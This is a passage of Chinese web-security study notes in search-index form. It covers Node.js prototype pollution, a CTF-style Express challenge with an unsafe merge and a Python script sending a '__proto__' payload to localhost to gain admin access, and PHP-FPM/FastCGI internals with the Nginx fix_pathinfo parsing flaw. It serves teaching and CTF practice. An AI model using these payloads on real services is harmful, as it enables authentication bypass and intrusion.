<p>\u539f\u578b\u94fe\u6c61\u67d3\u5c31\u662f\uff1a\u5728\u6211\u4eec\u60f3\u8981\u5229\u7528\u7684\u4ee3\u7801\u4e4b\u524d\u7684\u8d4b\u503c\u8bed\u53e5\u5982\u679c\u53ef\u63a7\u7684\u8bdd\uff0c\u6211\u4eec\u8fdb\u884c<code>__proto__</code>\u8d4b\u503c\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528\u4ee3\u7801\u4e86\u3002</p> <p>\u539f\u578b\u94fe\u6c61\u67d3\u4e00\u822c\u4f1a\u51fa\u73b0\u5728\u5bf9\u8c61\u3001\u6216\u6570\u7ec4\u7684\u952e\u540d\u6216\u5c5e\u6027\u540d\u53ef\u63a7,\u800c\u4e14\u662f\u8d4b\u503c\u8bed\u53e5\u7684\u60c5\u51b5\u4e0b\u3002</p> <pre><code>//\u7b80\u5355\u7684\u6765\u8bf4\u770b\u4e0b\u9762\u8fd9\u4e00\u5c0f\u6bb5\u4ee3\u7801\u5c31okvar obj = {\n   \"name\": \"ErDogQAQ\",\n   \"team\": \"ATL\"\n}\n\u200b\nconsole.log(obj.name);\nconsole.log(obj.team);\nconsole.log(obj);\n</code></pre> <p></p> <p>\u53d1\u73b0\u4e86\u5bf9\u8c61\u4e2d\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a<code>__proto__</code>\u7684\u952e(\u6211\u5728vscode\u4e0a\u81ea\u5df1\u5c1d\u8bd5\u6ca1\u6709\u8bd5\u51fa\u6765\uff0c\u67e5\u8be2\u597d\u50cf\u8ddfjson\u6587\u4ef6\u7684\u89e3\u6790\u6709\u5173)\uff0c\u800c\u4ed6\u5c31\u6307\u5411\u4ed6\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\uff0c\u6211\u4eec\u540e\u9762\u4e5f\u901a\u8fc7<code>A.__proto__.a = 2;</code>\u8fd9\u6837\u4fee\u6539\u8fd9\u4e2a\u952e\u7684\u503c\u7684\u65b9\u5f0f\u9020\u6210\u4e86\u539f\u578b\u94fe\u6c61\u67d3\uff0c\u5462\u4e48\u6211\u4eec\u4e5f\u5c31\u6709\u601d\u8def\u4e86\uff0c\u53ea\u8981\u627e\u5230\u90a3\u4e9b\u6211\u4eec\u80fd\u591f\u63a7\u5236\u6570\u7ec4\uff08\u4e5f\u5c31\u662f\u5bf9\u8c61\uff09\u7684\u952e\u540d\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u952e\u540d\u4e3a<code>__proto__</code>\u5e76\u63a7\u5236\u5b83\u7684\u503c\u7684\u65b9\u5f0f\u6765\u9020\u6210\u539f\u578b\u94fe\u6c61\u67d3\u3002</p> <p>\u5728\u5b9e\u9645\u4e2d\u80fd\u591f\u8fdb\u884c\u8fd9\u79cd\u53c2\u6570\u7684\u51fd\u6570\u4e00\u822c\u6709\uff1a</p> <p>\u5bf9\u8c61\u5408\u5e76\uff08merge\uff09\uff1b</p> <ul> <li> <p>\u5bf9\u8c61\u514b\u9686\uff08clone\uff09\uff08\u672c\u8d28\u8fd8\u662f\u5c06\u4e00\u4e2a\u5bf9\u8c61\u5408\u5e76\u5230\u7a7a\u5bf9\u8c61\u4e2d\uff09</p> </li> <li> <p>\u6240\u4ee5\u6765\u7a0d\u5fae\u5c1d\u8bd5\u4e00\u4e0b\uff1a</p> </li> </ul> <pre><code>function merge(target, source) {\nfor (let key in source) {\nif (key in source &amp;&amp; key in target) {\nmerge(target[key], source[key])\n} else {\ntarget[key] = source[key]\n}\n}\n}let o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\no3 = {}\nconsole.log(o3.b)\nconsole.log(o2)\n</code></pre> <p>\u8fd9\u91cc\u7684json.parse\u5c31\u662f\u524d\u9762\u7684\u89e3\u6790\u95ee\u9898\u4e86\uff0c\u8fd9\u6837\u7684\u8fd0\u884c\u7ed3\u679c\u662f\uff1a</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0o3.b\u5e26\u4e0a\u4e86\u503c\u3002</p> <p>\u7ed3\u5408\u524d\u9762\u63d0\u5230\u7684javascript\u7684\u7279\u6027\u6211\u4eec\u4e0d\u96be\u77e5\u9053\uff1a</p> <p>o2.__proto__\u6307\u5411\u7684\u662fo2\u7684\u57fa\u7c7b\uff0c\u6211\u4eec\u5047\u5b9a\u8ba4\u4e3a\u662fObeject\u7c7b</p> <p>o3\u672c\u6765\u5e94\u8be5\u662f{\u201cproto\u201d:OBject}(\u800c\u4e14\u8fd9\u4e2a\u5c5e\u6027\u4e00\u822c\u662f\u9690\u85cf\u7684)</p> <p>\u5f53\u8fdb\u884c\u8f93\u51fa\u67e5\u8be2\u65f6o3\u662f\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\u7684\uff0c\u6ca1\u6709\u7684\u8bdd\u5c31\u4f1a\u53bb\u5b83\u7684\u4e0a\u4e00\u5c42\u4e5f\u5c31\u662f__proto__\u6240\u6307\u5411\u7684\u7c7b\u53bb\u5bfb\u627e\u8fd9\u4e2ab\u5c5e\u6027\u3002\u800c\u5728\u5408\u5e76\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u5c06o2\u4e2d\u7684__proto__\u503c\u4e5f\u5408\u5e76\u4e86\u8d77\u6765\uff0c\u76f8\u5f53\u4e8e\u5bf9\u540c\u4e00\u5c42\u7c7b\u7684__proto__\u4e2d\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5c5e\u6027{\"b\":\"2\"}\uff0c\u4e5f\u5c31\u5728Object\u7c7b\u521b\u5efa\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u6700\u7ec8\u7684\u6307\u5411\u662f\uff1a</p> <pre><code>o1-&gt;o2-&gt;__proto__-&gt;Objecto3-&gt;\"b\"-&gt;__proto__-&gt;Object-&gt;\"b\"=2\n</code></pre> <p>\u8fd9\u5c31\u662f\u6f0f\u6d1e\u539f\u7406\uff0c\u5728\u6839\u7c7b\u6c61\u67d3\u51fa\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5143\u7d20\uff0c\u518d\u5229\u7528javascript\u7684\u9012\u5f52\u641c\u7d22\u8fc7\u7a0b\u627e\u5230\u8fd9\u4e2a\u6839\u7c7b\u4e2d\u7684\u5c5e\u6027\uff0c\u7531\u4e8e\u6c61\u67d3\u7684\u5143\u7d20\u6211\u4eec\u53ef\u63a7\uff0c\u6700\u7ec8\u76f8\u5f53\u4e8e\u6211\u4eec\u52ab\u6301\u4e86\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u53c2\u6570\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/JavaScript/Node.js/Nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/%E5%AE%9E%E6%88%98/","title":"\u5b9e\u6218","text":"<pre><code>const http = require(\"http\");\nconst express = require(\"express\");\nconst bodyParser = require(\"body-parser\");\nconst mixme = require(\"mixme\");\nconst session = require(\"express-session\");\nconst randomize = require(\"randomatic\");\nconst morgan = require(\"morgan\");\nconst app = express();//\u7c7b\u4f3c\u5b9a\u4e49\u7684\u5b8f\u5e38\u91cf\napp.set(\"json escape\", true);//\u8f6c\u4e49\napp.use(morgan(\"short\"));\napp.use(bodyParser.urlencoded({ extended: true })).use(bodyParser.json());\n// app.use(express.json());\napp.use(\nsession({\nname: \"session\",\nsecret: randomize(\"aA0\", 16),\nresave: false,\nsaveUninitialized: false,\n})\n);\nconst Super = {\npassone: process.env.sperson,//\u73af\u5883\u53d8\u91cf\u63a7\u5236\n};\nfunction blacklist(url) {\nvar evilwords = [\"DirectoryIterator\", \"FilesystemIterator\", \"GlobIterator\"];//\u8fd9\u91cc\u9762\u90fd\u662fphp\u7684\u7c7b\u540d\nvar arrayLen = evilwords.length;\nfor (var i = 0; i &lt; arrayLen; i++) {\nconst trigger = url.includes(evilwords[i]);\nif (trigger === true) {\nreturn true;\n}\n}\n}\n//TODO\n//get url content\napp.post(\"/getinfo\", (req, res) =&gt; {\nconsole.log(req.body);\nif (req.body.userid === undefined || req.body.key === undefined) {\nres.send(\"you want to post null?\");\n} else {\nlet userid = req.body.userid;\nlet key = req.body.key;\nconsole.log(userid);\nconsole.log(key);//\u5728\u63a7\u5236\u53f0\u4e0a\u8f93\u51fa\u4fe1\u606f\nif (Super[userid] === key) {\nres.send(\n\"admin!\\nyou can goto ***** endpoint to hack!\"\n);\n} else {\nres.send(\"You are not the Super, so I cannot give you the truth.\");\n}\n}\n});\napp.all(\"/\", (req, res) =&gt; {\nlet data = { userid: [], key: [] };\nconsole.log(data);\nconsole.log(req.body);\nif (req.method == \"POST\" &amp;&amp; req.body) {\ndata = mixme.merge(data, req.body);\nreq.session.data = data;\n// console.log(\"After MERGE: \" + Super[\"test\"]);\n}\nres.send(\"to be admin and you will find it!\");\n});\napp.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`));\n</code></pre> <p>\u8fd9\u5c31\u662f\u90a3\u5929\u7684\u6e90\u7801</p> <p>\u7b2c66\u884c\u6709\u4e2amerge\u5408\u5e76\u51fd\u6570</p> <p>51\u884c\u6709\u4e2a\u6bd4\u8f83\u7ed5\u8fc7</p> <p>\u6211\u4eec\u901a\u8fc7\u539f\u578b\u94fe\u7684\u6c61\u67d3\u6765\u8fc7</p> <p>\u4ee3\u7801\u903b\u8f91\u4e0d\u662f\u5f88\u96be</p> <p>\u6240\u4ee5\u6700\u7ec8\u6211\u4eec\u53ea\u9700\u8981\u4f20\u53c2\u5c31ok\u3002\u540e\u53f0\u4f30\u8ba1\u662f\u6709\u4e1c\u897f\u662f\u4e00\u76f4\u5728\u5220\u9664\uff0c\u6240\u4ee5\u6700\u597d\u6574\u4e2a\u811a\u672c\u3002</p> <pre><code>import requests\nimport time\nurl1='127.0.0.1'\nurl2='127.0.0.1/getinfo'\npost_data1='{\"__proto__\":{\"a\":\"b\"}}'\npost_data2='{\"userid\":\"a\",\"key\":\"b\"}'\nheaders = {\n\"Content-Type\":\"application/json\"\n}\nreqs1=requests.post(url1,data=post_data1,headers=headers)\nprint(reqs1.text)\ntime.sleep(0.5)\nreqs2=requests.post(url2,data=post_data2,headers=headers)\nprint(reqs2.text)\n</code></pre> <p>\uff08\u6211\u6ca1\u7528\u8fc7\u4f46\u5e94\u8be5\u5c31\u8fd9\u6837\u5427...\uff09</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","title":"PHP-FPM\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":"<p>Fastcgi\u5176\u5b9e\u662f\u4e00\u4e2a\u901a\u4fe1\u534f\u8bae\uff0c\u548cHTTP\u534f\u8bae\u4e00\u6837\uff0c\u90fd\u662f\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u4e00\u4e2a\u901a\u9053\u3002</p> <p>HTTP\u534f\u8bae\u662f\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u534f\u8bae\uff0c\u6d4f\u89c8\u5668\u5c06HTTP\u5934\u548cHTTP\u4f53\u7528\u67d0\u4e2a\u89c4\u5219\u7ec4\u88c5\u6210\u6570\u636e\u5305\uff0c\u4ee5TCP\u7684\u65b9\u5f0f\u53d1\u9001\u5230\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u6309\u7167\u89c4\u5219\u5c06\u6570\u636e\u5305\u89e3\u7801\uff0c\u5e76\u6309\u8981\u6c42\u62ff\u5230\u7528\u6237\u9700\u8981\u7684\u6570\u636e\uff0c\u518d\u4ee5HTTP\u534f\u8bae\u7684\u89c4\u5219\u6253\u5305\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u3002</p> <p>\u7c7b\u6bd4HTTP\u534f\u8bae\u6765\u8bf4\uff0cfastcgi\u534f\u8bae\u5219\u662f\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u548c\u67d0\u4e2a\u8bed\u8a00\u540e\u7aef\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u534f\u8bae\u3002Fastcgi\u534f\u8bae\u7531\u591a\u4e2arecord\u7ec4\u6210\uff0crecord\u4e5f\u6709header\u548cbody\u4e00\u8bf4\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u5c06\u8fd9\u4e8c\u8005\u6309\u7167fastcgi\u7684\u89c4\u5219\u5c01\u88c5\u597d\u53d1\u9001\u7ed9\u8bed\u8a00\u540e\u7aef\uff0c\u8bed\u8a00\u540e\u7aef\u89e3\u7801\u4ee5\u540e\u62ff\u5230\u5177\u4f53\u6570\u636e\uff0c\u8fdb\u884c\u6307\u5b9a\u64cd\u4f5c\uff0c\u5e76\u5c06\u7ed3\u679c\u518d\u6309\u7167\u8be5\u534f\u8bae\u5c01\u88c5\u597d\u540e\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u3002</p> <p>\u548cHTTP\u5934\u4e0d\u540c\uff0crecord\u7684\u5934\u56fa\u5b9a8\u4e2a\u5b57\u8282\uff0cbody\u662f\u7531\u5934\u4e2d\u7684contentLength\u6307\u5b9a\uff0c\u5176\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>typedef struct {\n/* Header */\nunsigned char version; // \u7248\u672c\nunsigned char type; // \u672c\u6b21record\u7684\u7c7b\u578b\nunsigned char requestIdB1; // \u672c\u6b21record\u5bf9\u5e94\u7684\u8bf7\u6c42id\nunsigned char requestIdB0;\nunsigned char contentLengthB1; // body\u4f53\u7684\u5927\u5c0f\nunsigned char contentLengthB0;\nunsigned char paddingLength; // \u989d\u5916\u5757\u5927\u5c0f\nunsigned char reserved;\n\n/* Body */\nunsigned char contentData[contentLength];\nunsigned char paddingData[paddingLength];\n} FCGI_Record;\n</code></pre> <p>\u5934\u75318\u4e2auchar\u7c7b\u578b\u7684\u53d8\u91cf\u7ec4\u6210\uff0c\u6bcf\u4e2a\u53d8\u91cf1\u5b57\u8282\u3002\u5176\u4e2d\uff0c<code>requestId</code>\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u5fd7id\uff0c\u4ee5\u907f\u514d\u591a\u4e2a\u8bf7\u6c42\u4e4b\u95f4\u7684\u5f71\u54cd\uff1b<code>contentLength</code>\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u8868\u793abody\u7684\u5927\u5c0f\u3002</p> <p>\u8bed\u8a00\u7aef\u89e3\u6790\u4e86fastcgi\u5934\u4ee5\u540e\uff0c\u62ff\u5230<code>contentLength</code>\uff0c\u7136\u540e\u518d\u5728TCP\u6d41\u91cc\u8bfb\u53d6\u5927\u5c0f\u7b49\u4e8e<code>contentLength</code>\u7684\u6570\u636e\uff0c\u8fd9\u5c31\u662fbody\u4f53\u3002</p> <p>Body\u540e\u9762\u8fd8\u6709\u4e00\u6bb5\u989d\u5916\u7684\u6570\u636e\uff08Padding\uff09\uff0c\u5176\u957f\u5ea6\u7531\u5934\u4e2d\u7684paddingLength\u6307\u5b9a\uff0c\u8d77\u4fdd\u7559\u4f5c\u7528\u3002\u4e0d\u9700\u8981\u8be5Padding\u7684\u65f6\u5019\uff0c\u5c06\u5176\u957f\u5ea6\u8bbe\u7f6e\u4e3a0\u5373\u53ef\u3002</p> <p>\u53ef\u89c1\uff0c\u4e00\u4e2afastcgi record\u7ed3\u6784\u6700\u5927\u652f\u6301\u7684body\u5927\u5c0f\u662f<code>2^16</code>\uff0c\u4e5f\u5c31\u662f65536\u5b57\u8282\u3002</p> <p><code>type</code>\u5c31\u662f\u6307\u5b9a\u8be5record\u7684\u4f5c\u7528\u3002\u56e0\u4e3afastcgi\u4e00\u4e2arecord\u7684\u5927\u5c0f\u662f\u6709\u9650\u7684\uff0c\u4f5c\u7528\u4e5f\u662f\u5355\u4e00\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728\u4e00\u4e2aTCP\u6d41\u91cc\u4f20\u8f93\u591a\u4e2arecord\u3002\u901a\u8fc7<code>type</code>\u6765\u6807\u5fd7\u6bcf\u4e2arecord\u7684\u4f5c\u7528\uff0c\u7528<code>requestId</code>\u4f5c\u4e3a\u540c\u4e00\u6b21\u8bf7\u6c42\u7684id\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u6b21\u8bf7\u6c42\uff0c\u4f1a\u6709\u591a\u4e2arecord\uff0c\u4ed6\u4eec\u7684<code>requestId</code>\u662f\u76f8\u540c\u7684\u3002</p> <p>\u5217\u51fa\u6700\u4e3b\u8981\u7684\u51e0\u79cd<code>type</code>\uff1a</p> <p></p> <p>\u770b\u4e86\u8fd9\u4e2a\u8868\u683c\u5c31\u5f88\u6e05\u695a\u4e86\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u548c\u540e\u7aef\u8bed\u8a00\u901a\u4fe1\uff0c\u7b2c\u4e00\u4e2a\u6570\u636e\u5305\u5c31\u662f<code>type</code>\u4e3a1\u7684record\uff0c\u540e\u7eed\u4e92\u76f8\u4ea4\u6d41\uff0c\u53d1\u9001<code>type</code>\u4e3a4\u30015\u30016\u30017\u7684record\uff0c\u7ed3\u675f\u65f6\u53d1\u9001<code>type</code>\u4e3a2\u30013\u7684record\u3002\u5f53\u540e\u7aef\u8bed\u8a00\u63a5\u6536\u5230\u4e00\u4e2a<code>type</code>\u4e3a4\u7684record\u540e\uff0c\u5c31\u4f1a\u628a\u8fd9\u4e2arecord\u7684body\u6309\u7167\u5bf9\u5e94\u7684\u7ed3\u6784\u89e3\u6790\u6210key-value\u5bf9\uff0c\u8fd9\u5c31\u662f\u73af\u5883\u53d8\u91cf\u3002\u73af\u5883\u53d8\u91cf\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>typedef struct {\nunsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */\nunsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */\nunsigned char nameData[nameLength];\nunsigned char valueData[valueLength];\n} FCGI_NameValuePair11;\n\ntypedef struct {\nunsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */\nunsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */\nunsigned char valueLengthB2;\nunsigned char valueLengthB1;\nunsigned char valueLengthB0;\nunsigned char nameData[nameLength];\nunsigned char valueData[valueLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\n} FCGI_NameValuePair14;\n\ntypedef struct {\nunsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */\nunsigned char nameLengthB2;\nunsigned char nameLengthB1;\nunsigned char nameLengthB0;\nunsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */\nunsigned char nameData[nameLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\nunsigned char valueData[valueLength];\n} FCGI_NameValuePair41;\n\ntypedef struct {\nunsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */\nunsigned char nameLengthB2;\nunsigned char nameLengthB1;\nunsigned char nameLengthB0;\nunsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */\nunsigned char valueLengthB2;\nunsigned char valueLengthB1;\nunsigned char valueLengthB0;\nunsigned char nameData[nameLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\nunsigned char valueData[valueLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\n} FCGI_NameValuePair44;\n</code></pre> <p>\u8fd9\u5176\u5b9e\u662f4\u4e2a\u7ed3\u6784\uff0c\u81f3\u4e8e\u7528\u54ea\u4e2a\u7ed3\u6784\uff0c\u6709\u5982\u4e0b\u89c4\u5219\uff1a</p> <ol> <li>key\u3001value\u5747\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair11</code></li> <li>key\u5927\u4e8e128\u5b57\u8282\uff0cvalue\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair41</code></li> <li>key\u5c0f\u4e8e128\u5b57\u8282\uff0cvalue\u5927\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair14</code></li> <li>key\u3001value\u5747\u5927\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair44</code></li> </ol> <p>\u4e3a\u4ec0\u4e48\u6211\u53ea\u4ecb\u7ecd<code>type</code>\u4e3a4\u7684record\uff1f\u56e0\u4e3a\u73af\u5883\u53d8\u91cf\u5728\u540e\u9762PHP-FPM\u91cc\u6709\u91cd\u8981\u4f5c\u7528\uff0c\u4e4b\u540e\u5199\u4ee3\u7801\u4e5f\u4f1a\u5199\u5230\u8fd9\u4e2a\u7ed3\u6784\u3002<code>type</code>\u7684\u5176\u4ed6\u60c5\u51b5\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u5df1\u7ffb\u6587\u6863\u7406\u89e3\u7406\u89e3\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#php-fpm_1","title":"PHP-FPM","text":"<p>FPM\u5176\u5b9e\u662f\u4e00\u4e2afastcgi\u534f\u8bae\u89e3\u6790\u5668\uff0cNginx\u7b49\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u5c06\u7528\u6237\u8bf7\u6c42\u6309\u7167fastcgi\u7684\u89c4\u5219\u6253\u5305\u597d\u901a\u8fc7TCP\u4f20\u7ed9\u8c01\uff1f\u5176\u5b9e\u5c31\u662f\u4f20\u7ed9FPM\u3002</p> <p>FPM\u6309\u7167fastcgi\u7684\u534f\u8bae\u5c06TCP\u6d41\u89e3\u6790\u6210\u771f\u6b63\u7684\u6570\u636e\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u7528\u6237\u8bbf\u95ee<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>\uff0c\u5982\u679cweb\u76ee\u5f55\u662f<code>/var/www/html</code>\uff0c\u90a3\u4e48Nginx\u4f1a\u5c06\u8fd9\u4e2a\u8bf7\u6c42\u53d8\u6210\u5982\u4e0bkey-value\u5bf9\uff1a</p> <pre><code>{\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'GET',\n'SCRIPT_FILENAME': '/var/www/html/index.php',\n'SCRIPT_NAME': '/index.php',\n'QUERY_STRING': '?a=1&amp;b=2',\n'REQUEST_URI': '/index.php?a=1&amp;b=2',\n'DOCUMENT_ROOT': '/var/www/html',\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '12345',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1'\n}\n</code></pre> <p>\u8fd9\u4e2a\u6570\u7ec4\u5176\u5b9e\u5c31\u662fPHP\u4e2d<code>$_SERVER</code>\u6570\u7ec4\u7684\u4e00\u90e8\u5206\uff0c\u4e5f\u5c31\u662fPHP\u91cc\u7684\u73af\u5883\u53d8\u91cf\u3002\u4f46\u73af\u5883\u53d8\u91cf\u7684\u4f5c\u7528\u4e0d\u4ec5\u662f\u586b\u5145<code>$_SERVER</code>\u6570\u7ec4\uff0c\u4e5f\u662f\u544a\u8bc9fpm\uff1a\u201c\u6211\u8981\u6267\u884c\u54ea\u4e2aPHP\u6587\u4ef6\u201d\u3002</p> <p>PHP-FPM\u62ff\u5230fastcgi\u7684\u6570\u636e\u5305\u540e\uff0c\u8fdb\u884c\u89e3\u6790\uff0c\u5f97\u5230\u4e0a\u8ff0\u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u3002\u7136\u540e\uff0c\u6267\u884c<code>SCRIPT_FILENAME</code>\u7684\u503c\u6307\u5411\u7684PHP\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f<code>/var/www/html/index.php</code>\u3002</p>"},{"location":"web_bak/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#nginxiis7","title":"Nginx\uff08IIS7\uff09\u89e3\u6790\u6f0f\u6d1e","text":"<p>Nginx\u548cIIS7\u66fe\u7ecf\u51fa\u73b0\u8fc7\u4e00\u4e2aPHP\u76f8\u5173\u7684\u89e3\u6790\u6f0f\u6d1e\uff08\u6d4b\u8bd5\u73af\u5883<code>https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability</code>\uff09\uff0c\u8be5\u6f0f\u6d1e\u73b0\u8c61\u662f\uff0c\u5728\u7528\u6237\u8bbf\u95ee<code>http://127.0.0.1/favicon.ico/.php</code>\u65f6\uff0c\u8bbf\u95ee\u5230\u7684\u6587\u4ef6\u662ffavicon.ico\uff0c\u4f46\u5374\u6309\u7167.php\u540e\u7f00\u89e3\u6790\u4e86\u3002</p> <p>\u7528\u6237\u8bf7\u6c42<code>http://127.0.0.1/favicon.ico/.php</code>\uff0cnginx\u5c06\u4f1a\u53d1\u9001\u5982\u4e0b\u73af\u5883\u53d8\u91cf\u5230fpm\u91cc\uff1a</p> <pre><code>{\n...\n'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php',\n'SCRIPT_NAME': '/favicon.ico/.php',\n'REQUEST_URI': '/favicon.ico/.php',\n'DOCUMENT_ROOT': '/var/www/html',\n...\n}\n</code></pre> <p>\u6b63\u5e38\u6765\u8bf4\uff0c<code>SCRIPT_FILENAME</code>\u7684\u503c\u662f\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6<code>/var/www/html/favicon.ico/.php</code>\uff0c\u662fPHP\u8bbe\u7f6e\u4e2d\u7684\u4e00\u4e2a\u9009\u9879<code>fix_pathinfo</code>\u5bfc\u81f4\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u3002PHP\u4e3a\u4e86\u652f\u6301Path Info\u6a21\u5f0f\u800c\u521b\u9020\u4e86<code>fix_pathinfo</code>\uff0c\u5728\u8fd9\u4e2a\u9009\u9879\u88ab\u6253\u5f00\u7684\u60c5\u51b5\u4e0b\uff0cfpm\u4f1a\u5224\u65ad<code>SCRIPT_FILENAME</code>\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5219\u53bb\u6389\u6700\u540e\u4e00\u4e2a<code>/</code>\u53ca\u4ee5\u540e\u7684\u6240\u6709\u5185\u5bb9\uff0c\u518d\u6b21\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u5f80\u6b21\u5faa\u73af\uff0c\u76f4\u5230\u6587\u4ef6\u5b58\u5728\u3002</p> <p>\u6240\u4ee5\uff0c\u7b2c\u4e00\u6b21fpm\u53d1\u73b0<code>/var/www/html/favicon.ico/.php</code>\u4e0d\u5b58\u5728\uff0c\u5219\u53bb\u6389<code>/.php</code>\uff0c\u518d\u5224\u65ad<code>/var/www/html/favicon.ico</code>\u662f\u5426\u5b58\u5728\u3002\u663e\u7136\u8fd9\u4e2a\u6587\u4ef6\u662f\u5b58\u5728\u7684\uff0c\u4e8e\u662f\u88ab\u4f5c\u4e3aPHP\u6587\u4ef6\u6267\u884c\uff0c\u5bfc\u81f4\u89e3\u6790\u6f0f\u6d1e\u3002</p> <p>\u6b63\u786e\u7684\u89e3\u51b3\u65b9\u6cd5\u6709\u4e24\u79cd\uff0c\u4e00\u662f\u5728Nginx\u7aef\u4f7f\u7528<code>fastcgi_split_path_info</code>\u5c06path 